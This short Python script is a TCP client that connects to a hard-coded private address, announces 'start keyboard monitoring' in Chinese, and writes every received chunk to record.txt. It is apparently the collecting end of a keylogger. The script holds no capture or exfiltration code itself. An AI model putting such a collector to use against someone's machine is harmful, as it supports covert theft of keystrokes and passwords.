import socket
import sys
import re
import os



class Client:
    def __init__(self , serverIp , serverPort):
        self.serverIp = serverIp  # 待连接的远程主机的域名
        self.serverPort = serverPort
        self.bufferSize = 10240

    def connet(self):  # 连接方法
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        except socket.error as e:
            print("Failed to create socket. Error: %s" % e)

        try:
            s.connect((self.serverIp , self.serverPort))
            print('开始键盘监控')
            while True:
                data = s.recv(self.bufferSize)  # 接收数据
                if not data:
                    break
                else:
                    with open('record.txt','a') as f:
                        f.write(data.decode('utf-8')+'\n')
                        print(data.decode('utf-8'))
        except socket.error:
            s.close()
            raise  # 退出进程
        finally:
            s.close()

if __name__ == '__main__':
    cl = Client('192.168.31.144' , 80)
    cl.connet()
    sys.exit()  # 退出进程
